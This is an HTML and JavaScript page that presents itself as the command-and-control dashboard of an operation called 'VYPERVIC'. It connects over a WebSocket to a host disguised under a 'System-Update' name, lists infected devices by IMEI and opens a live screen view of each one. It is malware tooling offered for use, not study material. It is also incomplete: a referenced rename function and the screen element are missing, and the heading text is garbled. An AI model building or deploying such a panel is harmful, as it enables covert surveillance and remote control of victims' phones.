<!DOCTYPE html>
<html>
<head>
    <title>VYPERVIC C2 Dashboard</title>
    <style>
        body { background: #1a1a1a; color: #00ff00; font-family: monospace; }
        .device { background: #333; padding: 10px; margin: 5px; cursor: pointer; }
        .features { display: none; }
        #screen { width: 100%; height: 600px; border: 2px solid #00ff00; }
    </style>
</head>
<body>
    <h1>ðŸ”¥ VYPERVIC C2 - Online Devices</h1>
    <div id="devices"></div>
    
    <script>
    const ws = new WebSocket('wss://vypervic001.github.io/VYPERVIC-System-Update/ws');
    const devices = {};
    
    ws.onmessage = (e) => {
        const data = JSON.parse(e.data);
        if(data.type === 'connect') {
            addDevice(data.imei, data.device);
        }
    };
    
    function addDevice(id, name) {
        const div = document.createElement('div');
        div.className = 'device';
        div.innerHTML = `${name} (${id}) <button onclick="rename('${id}')">Rename</button>`;
        div.onclick = () => showFeatures(id);
        document.getElementById('devices').appendChild(div);
    }
    
    function showFeatures(id) {
        // Feature drawer animation
        document.querySelectorAll('.features').forEach(f => f.style.display = 'none');
        // Live screen + controls
        document.getElementById('screen').src = `/screen/${id}`;
    }
    </script>
</body>
</html>
